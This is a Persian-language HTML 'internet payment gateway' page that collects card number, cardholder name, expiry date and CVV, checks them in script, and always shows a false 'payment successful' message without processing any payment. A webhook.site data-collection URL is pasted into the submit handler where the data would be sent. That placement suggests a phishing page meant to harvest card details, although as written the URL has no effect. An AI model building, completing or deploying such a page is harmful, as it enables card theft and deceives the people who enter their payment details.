<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title> درگاه پرداخت اینترنتی </title>
<style>
  body, html {
    height: 100%;
    margin: 0;
    font-family: Tahoma, sans-serif;
    background-color: #888888; /* خاکستری */
    display: flex;
    justify-content: center;
    align-items: center;
    direction: rtl;
  }
  .container {
    background: #fff;
    border-radius: 20px;
    padding: 30px 40px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
    width: 360px;
    max-width: 90vw;
    text-align: center;
  }
  h1 {
    color: #333;
    margin-bottom: 25px;
  }
  input, button {
    width: 100%;
    padding: 14px 15px;
    margin: 10px 0;
    font-size: 18px;
    border-radius: 12px;
    border: 1.5px solid #ccc;
    box-sizing: border-box;
    transition: border-color 0.3s ease;
  }
  input:focus {
    border-color: #4caf50;
    outline: none;
  }
  button {
    background-color: #4caf50;
    color: white;
    border: none;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 5px 15px rgba(76,175,80,0.4);
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #388e3c;
  }
  .message {
    margin-top: 20px;
    padding: 15px;
    border-radius: 12px;
    background-color: #e0f2e9;
    color: #2e7d32;
    font-weight: 700;
    display: none;
  }
</style>
</head>
<body>
  <div class="container">
    <h1> درگاه پرداخت اینترنتی</h1>
    <form id="paymentForm">
      <input type="number" id="amount" placeholder="مبلغ (تومان)" required min="1000" />
      <input type="text" id="cardNumber" placeholder="شماره کارت (16 رقم)" required pattern="\d{16}" maxlength="16" />
      <input type="text" id="cardHolder" placeholder="نام صاحب کارت" required />
      <input type="text" id="expiryDate" placeholder="تاریخ انقضا (MM/YY)" required pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" />
      <input type="text" id="cvv" placeholder="CVV (3 رقم)" required pattern="\d{3}" maxlength="3" />
      <button type="submit">پرداخت</button>
    </form>
    <div class="message" id="successMessage"></div>
  </div>

<script>
  const form = document.getElementById('paymentForm');
  const successMessage = document.getElementById('successMessage');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const amount = document.getElementById('amount').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const cardHolder = document.getElementById('cardHolder').value.trim();
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;

    if (cardNumber.length !== 16 || isNaN(cardNumber)) {
      alert('شماره کارت باید 16 رقم باشد.');
      return;
    }
    if (!cardHolder) {
      alert('نام صاحب کارت را وارد کنید.');
      return;
    }
    if (!expiryDate.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
      alert('تاریخ انقضا را به فرمت MM/YY وارد کنید.');
      return;
    }
    if (cvv.length !== 3 || isNaN(cvv)) {
      alert('کد CVV باید 3 رقم باشد.');
      return;
    }
https://webhook.site/5c896653-7f02-4929-90b9-5d8208abee9a
    // اینجا میتونید کد ارسال به سرور یا API پرداخت رو قرار بدید

    successMessage.style.display = 'block';
    successMessage.textContent = `پرداخت با موفقیت انجام شد! مبلغ: ${amount} تومان`;
    form.reset();

    setTimeout(() => {
      successMessage.style.display = 'none';
    }, 6000);
  });
</script>
</body>
</html>
